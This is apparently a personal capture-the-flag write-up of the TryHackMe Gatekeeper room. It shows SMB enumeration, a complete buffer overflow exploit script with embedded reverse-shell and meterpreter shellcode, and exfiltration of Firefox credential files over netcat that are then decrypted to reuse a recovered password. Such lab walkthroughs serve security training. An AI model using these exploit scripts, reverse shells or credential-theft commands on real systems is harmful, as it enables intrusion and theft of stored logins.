# Gatekeeper

**Room Link:** [https://tryhackme.com/room/gatekeeper](https://tryhackme.com/room/gatekeeper)



## Scanning

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

### **RPC/**TCP port 135

```
rpcclient -U '' $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

### **NetBIOS/**TCP port 139

```
nbtscan $VICTIM
```

<figure><img src="../../.gitbook/assets/image (8) (5).png" alt=""><figcaption></figcaption></figure>

### **SMB/**TCP port 445

I was able to download the file gatekeeper.exe file

```
smbclient -L //$VICTIM/
smbget -R smb://$VICTIM/Users
smbclient  \\\\$VICTIM\\Users
smb: \> cd Share
smb: \Share\> get gatekeeper.exe 
```

<figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

### Test Machine

As we have the .exe we're going to test on our Windows lab machine.

```
xfreerdp /u:admin /p:password /cert:ignore /v:$TESTMACHINE /workarea  +clipboard
python2 -m SimpleHTTPServer 81
```

![](<../../.gitbook/assets/image (68).png>)

### **Crash Replication & Controlling EIP**

I crashed the program by sending 1000 As

```
python -c 'print("A"* 1000)'
nc -v $TESTMACHINE 31337
```

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

**fuzzer.py**

```
#!/usr/bin/env python3

import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))
	timeout = 5
	prefix = ""
	string = prefix + "A" * 10

	while True:
		try:
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
				s.settimeout(timeout)
				s.connect((ip, port))
				
				print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
				s.send(bytes(string, "latin-1"))
				s.send(bytes("\n", "latin-1"))


		except:
			print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
			sys.exit(0)
		string += 10 * "A"
		time.sleep(1)

except:
    print ("\nCould not connect!")
    sys.exit()

```

The fuzzer didn't work as well as it did with other BOF problems. It kept sending bytes even after the program crashed so I had to manually watch when it crashed, which happened around a payload size of 150 bytes.

```
python fuzzer.py $VICTIM 1337
```

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

**exploit.py**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 146
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = ""
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

To control EIP I had to do a few attempts but eventually found out a offset of 146 is what I needed.

```
python exploit.py $VICTIM 1337
```



<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

### Finding Bad Characters

**Kali**

Now we changed the program to look for bad characters so we don't later use those bad characters when generating our payload. We do this by setting our payload to all possible characters, than follow EIP to see which characters aren't showing up. To do this we just have to keep running our exploit and removing the bad characters one by one. The bad characters found were: \x00\x0a

#### **exploit.py - Code Changes #1**

```
import socket, time, sys

#Bad chars found: \x00\x0a
badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 146
	overflow = "A" * offset
	retn = "BBBB"
	padding = ""
	payload = badChars
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```





<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

### Finding a Jump Point

Now we need to find a place to jump to to run our payload.  We find there is only one place that will meets our conditions that we need which is an address with  SafeSEH, ASLR, and NXCompat disabled and the memory address doesn't start with 0x00. ex: 0x0040000 won't work, 0x100000 will work. 0x08040000 is the only possible address to use but SafeSEH is not disabled.

**Immunity Debugger**

```
!mona modules
```

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

We find that gatekeeper.exe has 2 possible JMP ESPs to use. So we will start with the first one which is 0x080414c3 but when we add it to our code we need it in little endian format so it becomes \xaf\x11\x50\x62.

**Immunity Debugger**

```
!mona find -s "\xff\xe4" -m gatekeeper.exe
```

<figure><img src="../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

### Exploit - Staging

Now that we have the return address to use, we just need to generate our payload without using the bad characters found previously. I also added 16 NOPs before the payload as suggested in the room. All that is left is to is to update our code with our payload and run it against the program.

```
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

#### **exploit.py - Code Changes #2**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 146
	overflow = "A" * offset
	retn = "\xc3\x14\x04\x08"
	padding = "\x90" * 16
	payload = ( "\xbf\x99\x11\x01\x8f\xdd\xc6\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x7e\x12\x83\xc6\x04\x03\xe7\x1f\xe3\x7a\xeb\xc8\x61"
"\x84\x13\x09\x06\x0c\xf6\x38\x06\x6a\x73\x6a\xb6\xf8\xd1\x87"
"\x3d\xac\xc1\x1c\x33\x79\xe6\x95\xfe\x5f\xc9\x26\x52\xa3\x48"
"\xa5\xa9\xf0\xaa\x94\x61\x05\xab\xd1\x9c\xe4\xf9\x8a\xeb\x5b"
"\xed\xbf\xa6\x67\x86\x8c\x27\xe0\x7b\x44\x49\xc1\x2a\xde\x10"
"\xc1\xcd\x33\x29\x48\xd5\x50\x14\x02\x6e\xa2\xe2\x95\xa6\xfa"
"\x0b\x39\x87\x32\xfe\x43\xc0\xf5\xe1\x31\x38\x06\x9f\x41\xff"
"\x74\x7b\xc7\x1b\xde\x08\x7f\xc7\xde\xdd\xe6\x8c\xed\xaa\x6d"
"\xca\xf1\x2d\xa1\x61\x0d\xa5\x44\xa5\x87\xfd\x62\x61\xc3\xa6"
"\x0b\x30\xa9\x09\x33\x22\x12\xf5\x91\x29\xbf\xe2\xab\x70\xa8"
"\xc7\x81\x8a\x28\x40\x91\xf9\x1a\xcf\x09\x95\x16\x98\x97\x62"
"\x58\xb3\x60\xfc\xa7\x3c\x91\xd5\x63\x68\xc1\x4d\x45\x11\x8a"
"\x8d\x6a\xc4\x1d\xdd\xc4\xb7\xdd\x8d\xa4\x67\xb6\xc7\x2a\x57"
"\xa6\xe8\xe0\xf0\x4d\x13\x63\xf5\x9b\x2e\xaa\x61\x9e\x50\x5d"
"\x2e\x17\xb6\x37\xde\x71\x61\xa0\x47\xd8\xf9\x51\x87\xf6\x84"
"\x52\x03\xf5\x79\x1c\xe4\x70\x69\xc9\x04\xcf\xd3\x5c\x1a\xe5"
"\x7b\x02\x89\x62\x7b\x4d\xb2\x3c\x2c\x1a\x04\x35\xb8\xb6\x3f"
"\xef\xde\x4a\xd9\xc8\x5a\x91\x1a\xd6\x63\x54\x26\xfc\x73\xa0"
"\xa7\xb8\x27\x7c\xfe\x16\x91\x3a\xa8\xd8\x4b\x95\x07\xb3\x1b"
"\x60\x64\x04\x5d\x6d\xa1\xf2\x81\xdc\x1c\x43\xbe\xd1\xc8\x43"
"\xc7\x0f\x69\xab\x12\x94\x89\x4e\xb6\xe1\x21\xd7\x53\x48\x2c"
"\xe8\x8e\x8f\x49\x6b\x3a\x70\xae\x73\x4f\x75\xea\x33\xbc\x07"
"\x63\xd6\xc2\xb4\x84\xf3"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $TESTMACHINE 31337
```

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

### Exploit - Production

The program worked against our staging environment so it should work against the actual box we're trying to exploit. It ends up working with exploit.py.

**Kali #1**

```
rlwrap nc -lvnp 4444
```

**Kali #2**

```
python exploit.py $VICTIM 31337
```

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

I saw that the Victims OS is x64 and I wasn't able to run exes or powershell so I changed the payload. I first tried x64 payload but it wasn't working because it was to big so I switched to a meterpreter payload to avoid issues running commands.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$KALI LPORT=4444 EXITFUNC=thread -b "\x00\x0a" -f c
```

#### **exploit.py - Code Changes #3**

```
import socket, time, sys

try:
	ip = str(sys.argv[1])
	port = int(sys.argv[2])
	print (ip+":"+str(port))

	prefix = ""
	offset = 146
	overflow = "A" * offset
	retn = "\xc3\x14\x04\x08"
	padding = "\x90" * 16
	payload = ("\xbf\xcf\x9b\x6b\xd8\xd9\xce\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x5b\x83\xc3\x04\x31\x7b\x10\x03\x7b\x10\x2d\x6e\x97\x30\x33"
"\x91\x68\xc1\x53\x1b\x8d\xf0\x53\x7f\xc5\xa3\x63\x0b\x8b\x4f"
"\x08\x59\x38\xdb\x7c\x76\x4f\x6c\xca\xa0\x7e\x6d\x66\x90\xe1"
"\xed\x74\xc5\xc1\xcc\xb7\x18\x03\x08\xa5\xd1\x51\xc1\xa2\x44"
"\x46\x66\xfe\x54\xed\x34\xef\xdc\x12\x8c\x0e\xcc\x84\x86\x49"
"\xce\x27\x4a\xe2\x47\x30\x8f\xce\x1e\xcb\x7b\xa5\xa0\x1d\xb2"
"\x46\x0e\x60\x7a\xb5\x4e\xa4\xbd\x25\x25\xdc\xbd\xd8\x3e\x1b"
"\xbf\x06\xca\xb8\x67\xcd\x6c\x65\x99\x02\xea\xee\x95\xef\x78"
"\xa8\xb9\xee\xad\xc2\xc6\x7b\x50\x05\x4f\x3f\x77\x81\x0b\xe4"
"\x16\x90\xf1\x4b\x26\xc2\x59\x34\x82\x88\x74\x21\xbf\xd2\x10"
"\x86\xf2\xec\xe0\x80\x85\x9f\xd2\x0f\x3e\x08\x5f\xd8\x98\xcf"
"\xd6\xce\x1a\x1f\x50\x9e\xe4\xa0\xa1\xb7\x22\xf4\xf1\xaf\x83"
"\x75\x9a\x2f\x2b\xa0\x37\x25\xbb\x41\xc2\xcf\x92\x3e\xd0\x2f"
"\xf4\xe2\x5d\xc9\xa6\x4a\x0e\x45\x07\x3b\xee\x35\xef\x51\xe1"
"\x6a\x0f\x5a\x2b\x03\xba\xb5\x82\x7c\x53\x2f\x8f\xf6\xc2\xb0"
"\x05\x73\xc4\x3b\xac\x84\x8b\xcb\xc5\x96\xfc\xab\x25\x66\xfd"
"\x59\x26\x0c\xf9\xcb\x71\xb8\x03\x2d\xb5\x67\xfb\x18\xc5\x6f"
"\x03\xdd\xfc\x04\x32\x4b\x41\x72\x3b\x9b\x41\x82\x6d\xf1\x41"
"\xea\xc9\xa1\x11\x0f\x16\x7c\x06\x9c\x83\x7f\x7f\x71\x03\xe8"
"\x7d\xac\x63\xb7\x7e\x9b\xf7\xb0\x81\x5e\xd0\x18\xea\xa0\x60"
"\x99\xea\xca\x60\xc9\x82\x01\x4e\xe6\x62\xea\x45\xaf\xea\x61"
"\x08\x1d\x8a\x76\x01\xc3\x12\x77\xa6\xd8\xa5\x02\xc7\xdf\x45"
"\xf3\xc1\xbb\x45\xf4\xed\xbd\x7a\x23\xd4\xcb\xbd\xf0\x63\xd3"
"\x23\xdc\x99\x7c\xfa\xb5\x23\xe1\xfd\x60\x67\x1c\x7e\x80\x18"
"\xdb\x9e\xe1\x1d\xa7\x18\x1a\x6c\xb8\xcc\x1c\xc3\xb9\xc4"
		)
	postfix = ""

	buffer = prefix + overflow + retn + padding + payload + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(bytes(buffer + "\r\n", "latin-1"))
		print("Done!")
	except:
 		print("Could not connect.")
except:
    print ("\nCould not connect!")
    sys.exit()
```

**Kali #1**

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost eth0
set lport 4444
exploit -j
```

**Kali #2**

```
python exploit.py $VICTIM 31337
```

## Privilege Escalation

There wasn't much running on the server but I was able to see that firefox was running. Browsers can have credentials stored in them so I investigated further into this.

<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

```
meterpreter > run post/windows/gather/enum_applications
```

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

### **Transfer WinPeas**

I tried transfering WinPeas but it couldn't run.

**Kali**

```
wget https://github.com/carlospolop/PEASS-ng/releases/download/20221127/winPEASx64.exe 
python2 -m SimpleHTTPServer 81
```

**Victim**

```
cd C:\Users\natbat\Desktop
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/winPEASx64.exe','winPEASx64.exe')" 
winPEASx64.exe
```

### Transfer nc

To get the necessary files from Firefox we need to be able to transfer the files back to Kali so I transfered netcat.

**Kali**

<pre><code><strong>cp /root/Rooms/Follina-MSDT/nc64.exe .
</strong>python2 -m SimpleHTTPServer 81
</code></pre>

**Victim**

```
cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
cd ljfn812a.default-release
powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/nc64.exe','nc64.exe')" 
```

**Kali**&#x20;

We need to transfer the following files one by one.

```
nc -nlvp 1234 > logins.json
nc -nlvp 1234 > key4.db 
nc -nlvp 1234 > cert9.db 
nc -nlvp 1234 > cookies.sqlite
```

**Victim**

```
nc64.exe -nv $KALI 1234 < logins.json
nc64.exe -nv $KALI 1234 < key4.db 
nc64.exe -nv $KALI 1234 < cert9.db 
nc64.exe -nv $KALI 1234 < cookies.sqlite
```

**Kali**&#x20;

```
git clone https://github.com/unode/firefox_decrypt.git
python3.9 firefox_decrypt.py ./
```

<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

**Credentials Found**

```
Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
```

**Kali**

```
python3.9 /opt/impacket/build/scripts-3.9/psexec.py mayor@$VICTIM
Password: 8CL7O1N78MdrCIsV
```

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

